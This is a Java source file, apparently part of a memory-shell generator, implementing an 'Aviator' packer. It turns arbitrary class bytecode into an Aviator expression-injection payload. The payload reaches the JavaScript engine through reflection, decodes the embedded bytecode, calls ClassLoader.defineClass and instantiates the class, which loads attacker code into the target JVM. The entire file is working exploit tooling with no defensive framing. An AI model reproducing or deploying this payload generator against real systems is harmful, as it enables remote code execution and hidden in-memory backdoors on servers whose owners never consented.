package org.leo.jmg.mem.packer.aviator;

import org.leo.core.util.ByteEncodeUtil;
import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;

@PackerMeta(name = "Aviator", order = 100)
public class AviatorPacker implements Packer {

    @Override
    public String pack(ClassPackerConfig config) {

        String jsCode = buildJavaScriptCode(config.getClassName(), config.getClassBytesBase64Str());
        String aviatorExpr = buildAviatorExpression(jsCode);

        return aviatorExpr;
    }

    /**
     * 构建 Aviator 表达式，调用 JS 引擎执行生成的脚本
     */
    private String buildAviatorExpression(String jsCode) {
        String escapedJs = escapeDoubleQuote(jsCode);
        return String.format(
                "use javax.script.ScriptEngineManager;" +
                        "use sun.reflect.misc.MethodUtil;" +
                        "use javax.xml.bind.DatatypeConverter;" +
                        "MethodUtil.invoke(MethodUtil.getMethod(Class.forName(\"javax.script.ScriptEngine\"),\"eval\",seq.array(java.lang.Class,Class.forName(\"java.lang.String\"))),MethodUtil.invoke(MethodUtil.getMethod(Class.forName(\"javax.script.ScriptEngineManager\"),\"getEngineByExtension\",seq.array(java.lang.Class,Class.forName(\"java.lang.String\"))),new ScriptEngineManager(),tuple(\"js\")),tuple(new String(DatatypeConverter.parseBase64Binary(\"%s\"))));\n", ByteEncodeUtil.base64EncodeWithoutTailEquals(escapedJs)
        );
    }

    /**
     * 构建 JavaScript 代码，用于定义类并实例化
     */
    private String buildJavaScriptCode(String className, String base64Code) {
        String escapedClassName = escapeSingleQuote(className);
        String escapedBase64Code = escapeSingleQuote(base64Code);

        return String.format(
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                        "try{" +
                        "    classLoader.loadClass('%s').newInstance();" +
                        "}catch (e){" +
                        "    var clsString = classLoader.loadClass('java.lang.String');" +
                        "    var bytecodeBase64 = '%s';" +
                        "    var bytecode;" +
                        "    try{" +
                        "        var clsBase64 = classLoader.loadClass('java.util.Base64');" +
                        "        var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');" +
                        "        var decoder = clsBase64.getMethod('getDecoder').invoke(null);" +
                        "        bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64);" +
                        "    } catch (ee) {" +
                        "        try {" +
                        "            var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter');" +
                        "            bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64);" +
                        "        } catch (eee) {" +
                        "            var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder');" +
                        "            bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);" +
                        "        }" +
                        "    }" +
                        "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');" +
                        "    var clsByteArray = (new java.lang.String('a').getBytes().getClass());" +
                        "    var clsInt = java.lang.Integer.TYPE;" +
                        "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);" +
                        "    defineClass.setAccessible(true);" +
                        "    var clazz = defineClass.invoke(classLoader, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));" +
                        "    clazz.newInstance();" +
                        "}",
                escapedClassName,
                escapedBase64Code
        );
    }

    /**
     * 转义单引号，避免嵌入 JS 字符串时破坏语法
     */
    private String escapeSingleQuote(String str) {
        if (str == null) {
            return "";
        }
        return str.replace("'", "\\'");
    }

    /**
     * 转义双引号，避免嵌入 Aviator 字符串时破坏语法
     */
    private String escapeDoubleQuote(String str) {
        if (str == null) {
            return "";
        }
        return str.replace("\"", "\\\"");
    }


}
